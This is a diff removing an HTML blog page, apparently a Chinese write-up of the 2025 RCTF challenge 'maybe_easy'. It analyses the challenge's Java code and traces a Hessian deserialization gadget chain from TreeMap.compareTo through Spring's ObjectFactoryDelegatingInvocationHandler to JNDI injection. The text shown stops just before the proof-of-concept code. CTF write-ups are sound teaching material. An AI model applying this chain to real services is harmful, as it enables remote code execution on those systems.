@@ -1,1324 +1,288 @@
-<!DOCTYPE html>
-<html lang="zh-cn" dir="ltr">
-    <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="2025RCTFwp maybe_easy jar包下下来先看依赖，hessian4.0.66\n入口在controller\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.rctf.server.controller; import com.rctf.server.tool.HessianFactory; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; @Controller public class RCTFController { @RequestMapping({&#34;/hello&#34;}) public String hello(@RequestParam(name = &#34;data&#34;,required = false) String data) throws Exception { Object obj = HessianFactory.deserialize(data); return &#34;hello&#34;; } } hello路由传data反序列化\n">
-<title>2025RCTFwp</title>
-
-<link rel='canonical' href='https://0d000721999.github.io/p/2025rctfwp/'>
-
-<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="2025RCTFwp">
-<meta property='og:description' content="2025RCTFwp maybe_easy jar包下下来先看依赖，hessian4.0.66\n入口在controller\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.rctf.server.controller; import com.rctf.server.tool.HessianFactory; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; @Controller public class RCTFController { @RequestMapping({&#34;/hello&#34;}) public String hello(@RequestParam(name = &#34;data&#34;,required = false) String data) throws Exception { Object obj = HessianFactory.deserialize(data); return &#34;hello&#34;; } } hello路由传data反序列化\n">
-<meta property='og:url' content='https://0d000721999.github.io/p/2025rctfwp/'>
-<meta property='og:site_name' content='美咕噜的小站'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='java' /><meta property='article:published_time' content='2025-11-19T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-11-19T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/2025rctfwp/1.webp' />
-<meta name="twitter:title" content="2025RCTFwp">
-<meta name="twitter:description" content="2025RCTFwp maybe_easy jar包下下来先看依赖，hessian4.0.66\n入口在controller\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.rctf.server.controller; import com.rctf.server.tool.HessianFactory; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; @Controller public class RCTFController { @RequestMapping({&#34;/hello&#34;}) public String hello(@RequestParam(name = &#34;data&#34;,required = false) String data) throws Exception { Object obj = HessianFactory.deserialize(data); return &#34;hello&#34;; } } hello路由传data反序列化\n"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://0d000721999.github.io/p/2025rctfwp/1.webp' />
-    <link rel="shortcut icon" href="/favicon.ico" />
-
-    </head>
-    <body class="
-    article-page
-    ">
-    <script>
-        (function() {
-            const colorSchemeKey = 'StackColorScheme';
-            localStorage.setItem(colorSchemeKey, "light");
-        })();
-    </script><script>
-    (function() {
-        const colorSchemeKey = 'StackColorScheme';
-        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
-        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
-
-        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
-            
-
-            document.documentElement.dataset.scheme = 'dark';
-        } else {
-            document.documentElement.dataset.scheme = 'light';
-        }
-    })();
-</script>
-<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
-    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
-        <span class="hamburger-box">
-            <span class="hamburger-inner"></span>
-        </span>
-    </button>
-
-    <header>
-        
-            
-            <figure class="site-avatar">
-                <a href="/">
-                
-                    
-                    
-                    
-                        
-                        <img src="/img/avatar_hu988272603220494224.png" width="300"
-                            height="300" class="site-logo" loading="lazy" alt="Avatar">
-                    
-                
-                </a>
-                
-                    <span class="emoji">😋</span>
-                
-            </figure>
-            
-        
-        
-        <div class="site-meta">
-            <h1 class="site-name"><a href="/">美咕噜的小站</a></h1>
-            <h2 class="site-description">Ciallo～(∠・ω&lt; )⌒★</h2>
-        </div>
-    </header><ol class="menu-social">
-            
-                <li>
-                    <a 
-                        href='https://buuoj.cn/users/175721'
-                        target="_blank"
-                        title="BUUOJ"
-                        rel="me"
-                    >
-                        
-                        
-                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
-  <line x1="7" y1="12" x2="13" y2="12" />
-</svg>
-
-
-
-                        
-                    </a>
-                </li>
-            
-                <li>
-                    <a 
-                        href='https://github.com/0d000721999'
-                        target="_blank"
-                        title="GitHub"
-                        rel="me"
-                    >
-                        
-                        
-                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
-  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
-</svg>
-
-
-
-                        
-                    </a>
-                </li>
-            
-        </ol><ol class="menu" id="main-menu">
-        
-        
-        
-        <li >
-            <a href='/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="5 12 3 12 12 3 21 12 19 12" />
-  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
-  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
-</svg>
-
-
-
-                
-                <span>主页</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/%E5%85%B3%E4%BA%8E/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="7" r="4" />
-  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
-</svg>
-
-
-
-                
-                <span>关于</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/archives/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <rect x="3" y="4" width="18" height="4" rx="2" />
-  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
-  <line x1="10" y1="12" x2="14" y2="12" />
-</svg>
-
-
-
-                
-                <span>Archives</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/search/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
-
-
-
-                
-                <span>Search</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/friends/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <line x1="5" y1="9" x2="19" y2="9" />
-  <line x1="5" y1="15" x2="19" y2="15" />
-  <line x1="11" y1="4" x2="7" y2="20" />
-  <line x1="17" y1="4" x2="13" y2="20" />
-</svg>
-
-
-
-                
-                <span>Friends</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/links/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
-  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
-</svg>
-
-
-
-                
-                <span>Links</span>
-            </a>
-        </li>
-        
-        <li class="menu-bottom-section">
-            <ol class="menu">
-
-                
-            </ol>
-        </li>
-    </ol>
-</aside>
-
-    
-
-            <main class="main full-width">
-    <article class="has-image main-article">
-    <header class="article-header">
-        <div class="article-image">
-            <a href="/p/2025rctfwp/">
-                <img src="/p/2025rctfwp/1.webp"
-                        
-                        width="2134" 
-                        height="1200" 
-                        loading="lazy"
-                        alt="Featured image of post 2025RCTFwp" />
-                
-            </a>
-        </div>
-    
-
-    <div class="article-details">
-    
-    <header class="article-category">
-        
-            <a href="/categories/wp/" style="background-color: #2a9d8f; color: #fff;">
-                Wp
-            </a>
-        
-    </header>
-    
-
-    <div class="article-title-wrapper">
-        <h2 class="article-title">
-            <a href="/p/2025rctfwp/">2025RCTFwp</a>
-        </h2>
-    
-        
-    </div>
-
-    
-    
-    
-    
-    <footer class="article-time">
-        
-            <div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
-  <circle cx="18" cy="18" r="4" />
-  <path d="M15 3v4" />
-  <path d="M7 3v4" />
-  <path d="M3 11h16" />
-  <path d="M18 16.496v1.504l1 1" />
-</svg>
-                <time class="article-time--published">Nov 19, 2025</time>
-            </div>
-        
-
-        
-            <div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <polyline points="12 7 12 12 15 15" />
-</svg>
-
-
-
-                <time class="article-time--reading">
-                    阅读时长: 4 分钟
-                </time>
-            </div>
-        
-    </footer>
-    
-
-    
-</div>
-
-</header>
-
-    <section class="article-content">
-    
-    
-    <h1 id="2025rctfwp">2025RCTFwp
-</h1><h2 id="maybe_easy">maybe_easy
-</h2><p>jar包下下来先看依赖，hessian4.0.66</p>
-<p>入口在controller</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.rctf.server.controller</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.rctf.server.tool.HessianFactory</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.stereotype.Controller</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RequestParam</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@Controller</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RCTFController</span><span class="w"> </span><span class="p">{</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@RequestMapping</span><span class="p">({</span><span class="s">&#34;/hello&#34;</span><span class="p">})</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">hello</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;data&#34;</span><span class="p">,</span><span class="n">required</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HessianFactory</span><span class="p">.</span><span class="na">deserialize</span><span class="p">(</span><span class="n">data</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;hello&#34;</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p>hello路由传data反序列化</p>
-<p>Maybe类里面的compareto方法想到打treeMap，而且还会调用InvocationHandler</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.rctf.server.tool</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.Serializable</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Method</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Proxy</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Maybe</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">Proxy</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Comparable</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="n">Serializable</span><span class="w"> </span><span class="p">{</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Maybe</span><span class="p">(</span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">h</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">(</span><span class="n">h</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">compareTo</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Comparable</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;compareTo&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Object</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">h</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">method</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">o</span><span class="p">});</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">Integer</span><span class="p">)</span><span class="n">result</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Throwable</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RuntimeException</span><span class="p">(</span><span class="n">e</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p>然后看hessian工厂类，定义了hessian的序列化和反序列化函数，设置白名单</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">static</span><span class="w"> </span><span class="p">{</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">WHITE_PACKAGES</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="s">&#34;com.rctf.server.tool.&#34;</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">WHITE_PACKAGES</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="s">&#34;java.util.&#34;</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">WHITE_PACKAGES</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="s">&#34;org.apache.commons.logging.&#34;</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">WHITE_PACKAGES</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="s">&#34;org.springframework.beans.&#34;</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">WHITE_PACKAGES</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="s">&#34;org.springframework.jndi.&#34;</span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p>搜索hessian反序列化文章：<a class="link" href="https://su18.org/post/hessian/#groovy"  target="_blank" rel="noopener"
-    >Hessian 反序列化知一二 | 素十八</a></p>
-<p>直接找compareto的利用</p>
-<p><img src="/p/2025rctfwp/image-20251118193856691.png"
-	width="1218"
-	height="670"
-	srcset="/p/2025rctfwp/image-20251118193856691_hu13430755020202021354.png 480w, /p/2025rctfwp/image-20251118193856691_hu747516671303482974.png 1024w"
-	loading="lazy"
-	
-		alt="image-20251118193856691"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="181"
-		data-flex-basis="436px"
-	
-></p>
-<p><img src="/p/2025rctfwp/image-20251118194037530.png"
-	width="1197"
-	height="815"
-	srcset="/p/2025rctfwp/image-20251118194037530_hu1406493740945388140.png 480w, /p/2025rctfwp/image-20251118194037530_hu9105613557809907667.png 1024w"
-	loading="lazy"
-	
-		alt="image-20251118194037530"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="146"
-		data-flex-basis="352px"
-	
-></p>
-<p>然后我们去ysomap看一下这里链子怎么实现的</p>
-<p><img src="/p/2025rctfwp/image-20251118194336442.png"
-	width="1265"
-	height="836"
-	srcset="/p/2025rctfwp/image-20251118194336442_hu2336273917973181506.png 480w, /p/2025rctfwp/image-20251118194336442_hu6415930513039432199.png 1024w"
-	loading="lazy"
-	
-		alt="image-20251118194336442"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="151"
-		data-flex-basis="363px"
-	
-></p>
-<p>也就是说这里的compareTo能被TreeMap类触发，然后触发其他类的动态代理，显然是入口</p>
-<p>接下来就是查找InvocationHandler的用法，看一下白名单里面哪些类继承了这个接口</p>
-<p><img src="/p/2025rctfwp/image-20251118200006149.png"
-	width="904"
-	height="270"
-	srcset="/p/2025rctfwp/image-20251118200006149_hu2662164104485050860.png 480w, /p/2025rctfwp/image-20251118200006149_hu15921692201204188648.png 1024w"
-	loading="lazy"
-	
-		alt="image-20251118200006149"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="334"
-		data-flex-basis="803px"
-	
-></p>
-<p>分別看看这三个</p>
-<p><img src="/p/2025rctfwp/image-20251118200440623.png"
-	width="1102"
-	height="715"
-	srcset="/p/2025rctfwp/image-20251118200440623_hu2968840242792845165.png 480w, /p/2025rctfwp/image-20251118200440623_hu3799762111412744477.png 1024w"
-	loading="lazy"
-	
-		alt="image-20251118200440623"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="154"
-		data-flex-basis="369px"
-	
-></p>
-<p>没啥用</p>
-<p><img src="/p/2025rctfwp/image-20251118200703073.png"
-	width="963"
-	height="529"
-	srcset="/p/2025rctfwp/image-20251118200703073_hu10592941523867686863.png 480w, /p/2025rctfwp/image-20251118200703073_hu8414910567670229838.png 1024w"
-	loading="lazy"
-	
-		alt="image-20251118200703073"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="182"
-		data-flex-basis="436px"
-	
-></p>
-<p>跟进去其实有个toString方法，不过后续利用还是个问题</p>
-<p>最后看<code>ObjectFactoryDelegatingInvocationHandler</code></p>
-<p><img src="/p/2025rctfwp/image-20251118200801342.png"
-	width="1175"
-	height="738"
-	srcset="/p/2025rctfwp/image-20251118200801342_hu15986813439590266802.png 480w, /p/2025rctfwp/image-20251118200801342_hu1537906866161413580.png 1024w"
-	loading="lazy"
-	
-		alt="image-20251118200801342"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="159"
-		data-flex-basis="382px"
-	
-></p>
-<p>invoke方法里面的objetFactory可控，可以调用getObject方法</p>
-<p>接下来就是找能用的objectFactory类</p>
-<p><img src="/p/2025rctfwp/image-20251118201426215.png"
-	width="940"
-	height="347"
-	srcset="/p/2025rctfwp/image-20251118201426215_hu7413791928932277252.png 480w, /p/2025rctfwp/image-20251118201426215_hu9823890835823240427.png 1024w"
-	loading="lazy"
-	
-		alt="image-20251118201426215"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="270"
-		data-flex-basis="650px"
-	
-></p>
-<p><img src="/p/2025rctfwp/image-20251118201443825.png"
-	width="1148"
-	height="654"
-	srcset="/p/2025rctfwp/image-20251118201443825_hu8841752434225438624.png 480w, /p/2025rctfwp/image-20251118201443825_hu6359494754166328288.png 1024w"
-	loading="lazy"
-	
-		alt="image-20251118201443825"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="175"
-		data-flex-basis="421px"
-	
-></p>
-<p>显然可以用，它的getObject可以调用getBean方法，而且其中的参数都可控</p>
-<p>接下来找符合条件的BeanFactory,翻找beans包下面没有可用的，查找jndi包的</p>
-<p><img src="/p/2025rctfwp/image-20251118202633050.png"
-	width="963"
-	height="521"
-	srcset="/p/2025rctfwp/image-20251118202633050_hu15481183495557412650.png 480w, /p/2025rctfwp/image-20251118202633050_hu5965191598546351556.png 1024w"
-	loading="lazy"
-	
-		alt="image-20251118202633050"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="184"
-		data-flex-basis="443px"
-	
-></p>
-<p>查看它的getBean方法</p>
-<p><img src="/p/2025rctfwp/image-20251118202818536.png"
-	width="1176"
-	height="693"
-	srcset="/p/2025rctfwp/image-20251118202818536_hu9404884453590055117.png 480w, /p/2025rctfwp/image-20251118202818536_hu10050229526127754298.png 1024w"
-	loading="lazy"
-	
-		alt="image-20251118202818536"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="169"
-		data-flex-basis="407px"
-	
-></p>
-<p>那还说啥了，这里可以JNDI注入</p>
-<p>接下来就是搓poc环节</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span></code></pre></td>
-<td class="lntd">
